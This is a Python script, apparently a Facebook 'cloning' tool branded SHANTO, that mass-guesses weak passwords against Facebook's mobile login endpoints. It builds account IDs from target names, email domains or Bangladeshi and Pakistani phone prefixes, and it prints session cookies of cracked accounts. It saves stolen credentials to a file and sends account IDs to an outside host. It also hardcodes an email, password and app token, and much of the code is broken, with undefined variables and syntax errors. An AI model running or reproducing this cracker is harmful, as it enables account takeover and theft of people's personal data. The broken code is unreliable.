#SC MAKED BY SHANTO
#Fuck SHANTO HOSSEN
#Dec By SHANTO
#SHANTO Your Reyal Pappa
#SHANTO Kids Numbar 5

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []

ua = 'Dalvik/2.1.0 (Linux; U; Android 1; CPH65673X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9699.0.0.808.9[FBAN/FB4A;FBAV/1779.0.0.88.96;[FBAN/FB4A;FBAV/9706.0.0.88.96;[FBAN/FB4A;FBAV/7398.0.0.88.96;FBBV/426492151;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/CPH65673X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=3045,height=7743};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 11; CPH69419g Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3006.0.0.808.9[FBAN/FB4A;FBAV/4762.0.0.88.96;[FBAN/FB4A;FBAV/183.0.0.88.96;[FBAN/FB4A;FBAV/6312.0.0.88.96;FBBV/5326933385;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/CPH69419g;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1162,height=2322};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 3; RMX87475l Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9952.0.0.808.9[FBAN/FB4A;FBAV/3143.0.0.88.96;[FBAN/FB4A;FBAV/1701.0.0.88.96;[FBAN/FB4A;FBAV/8523.0.0.88.96;FBBV/3527577794;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX87475l;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2888,height=4755};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; RMX3317F Build/OPM4.579514.034) [FBAN/FB4A;FBAV/1151.0.0.808.9[FBAN/FB4A;FBAV/5421.0.0.88.96;[FBAN/FB4A;FBAV/1040.0.0.88.96;[FBAN/FB4A;FBAV/9229.0.0.88.96;FBBV/62779724758;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX3317F;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2206,height=7276};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX11480n Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3146.0.0.808.9[FBAN/FB4A;FBAV/2806.0.0.88.96;[FBAN/FB4A;FBAV/308.0.0.88.96;[FBAN/FB4A;FBAV/6587.0.0.88.96;FBBV/52811016876;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX11480n;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=706,height=1174};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 13; moto g15136v Build/OPM4.579514.034) [FBAN/FB4A;FBAV/7453.0.0.808.9[FBAN/FB4A;FBAV/6167.0.0.88.96;[FBAN/FB4A;FBAV/2162.0.0.88.96;[FBAN/FB4A;FBAV/7371.0.0.88.96;FBBV/48357446201;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/moto g15136v;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2753,height=1041};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 2; RMX22952Z Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9723.0.0.808.9[FBAN/FB4A;FBAV/2927.0.0.88.96;[FBAN/FB4A;FBAV/5285.0.0.88.96;[FBAN/FB4A;FBAV/5859.0.0.88.96;FBBV/1419235172;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX22952Z;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=449,height=4631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 17; GT-15453y Build/OPM4.579514.034) [FBAN/FB4A;FBAV/8548.0.0.808.9[FBAN/FB4A;FBAV/9326.0.0.88.96;[FBAN/FB4A;FBAV/8279.0.0.88.96;[FBAN/FB4A;FBAV/4087.0.0.88.96;FBBV/50084369326;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/GT-15453y;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2650,height=1923};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX24382h Build/OPM4.579514.034) [FBAN/FB4A;FBAV/535.0.0.808.96[FBAN/FB4A;FBAV/7101.0.0.88.96;[FBAN/FB4A;FBAV/5435.0.0.88.96;[FBAN/FB4A;FBAV/5124.0.0.88.96;FBBV/19053648879;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/RMX24382h;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2538,height=4864};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 15; GT-49806X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/5535.0.0.808.9[FBAN/FB4A;FBAV/8838.0.0.88.96;[FBAN/FB4A;FBAV/1025.0.0.88.96;[FBAN/FB4A;FBAV/8398.0.0.88.96;FBBV/77025542825;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/GT-49806X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2941,height=7198};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; SC-99359f Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4221.0.0.808.9[FBAN/FB4A;FBAV/6577.0.0.88.96;[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/7914.0.0.88.96;FBBV/36318278322;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/SC-99359f;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1637,height=1739};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 14099w Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4743.0.0.808.9[FBAN/FB4A;FBAV/7360.0.0.88.96;[FBAN/FB4A;FBAV/628.0.0.88.96;[FBAN/FB4A;FBAV/4448.0.0.88.96;FBBV/17141943492;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/Redmi 14099w;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=4213,height=3631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5; SC-76753r Build/OPM4.579514.034) [FBAN/FB4A;FBAV/589.0.0.808.96[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/4379.0.0.88.96;[FBAN/FB4A;FBAV/8738.0.0.88.96;FBBV/22243748677;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/SC-76753r;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=322,height=5573};FB_FW/1;]'
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#-------checker------#
import os, uuid, random
import requests as r

def login():
    os.system("clear")
    print("\033[1;37m")
    uid = love+lova+lovb+guru
    pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
    check(uid, pww, ua)

def check(uid, pww, ua):
    try:
        data = {
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "email": ridoyhossenshanto007@gmail.com,
            "password": Rj84843322,
            "cpl": "fales",
            "source": "device_based_login",
            "format": "json",
            "generate_session_cookies": "1",
            "generate_analytic_claims": "1",
            "generate_machine_id": "1",
            "locale": "GB",
            "country_code": "GB",
            "client_country_code": "GB",
            "currently_logged_in_userid": "0",
        }
        headers = {
            "User-Agent": ua,
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-HTTP-Engine": "Liger",
        }
        url = "https://b-graph.facebook.com/auth/login"
        result = r.post(url, data=data, headers=headers).json()
        print(result)
    except:
        pass

login()

logo = ("""
\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
                                                 
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PRIVATE
\033[1;32m[-] AUTHOR    :\033[1;32m SHANTO 
\033[1;32m[-] GITHUB    :\033[1;32m SHANTO
\033[1;32m[-] FACEBOOK  :\033[1;32m SH AN TO
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SHANTO BRAND\033[;0m\033[1;91m═══>\033[1;92m""")


class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(" \033[1;97m[1] FACEBOOK EMAIL ID CLONING     \033[1;91m[WORKING] ")
        print(" \033[1;97m[2] FACEBOOK USERNAME CLONING     \033[1;35m[BEST]")
        print(" \033[1;97m[3] FACEBOOK VIP RANDOM CLONING   \033[1;33m[FIRE]")
        print(" \033[1;97m[0] Exit")
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [🔥]  TERGET FIRST NAME : ')
    kodex = input(' [🔥] TERGET LAST NAME :  ')
    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(' [📧]  Input Doamin  : ')
    limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [🔥]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [🔥]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[🔥]  The process has been started')
        print(' [🔥]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [🔥]  TERGET FIRST NAME : ')
    kodex = input(' [🔥] TERGET FIRST NAME :  ')
    doamin = '.'
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [🔥]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [♥]  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;97m[♥]  The process has been started')
        print(' [♥]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v3():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID CLONE")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    
    kode = input(' [📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' FACEBOOK VIP CLONING (BD NUMBER) '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;33m [♥]  TOTAL IDS :\033[1;92m '+tl)
        print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
        print(' \033[1;33m [♥]  THE CRACK PROCESS HAS BEEN STARTED')
        print(' \033[1;33m [♥]  WAIT FOR IDS ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mSHANTO\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://web.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',
}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
                    print(f"\033[38;5;46m[SHANTO-OK🌻] {uid}|{ps}")
                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SHANTO-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
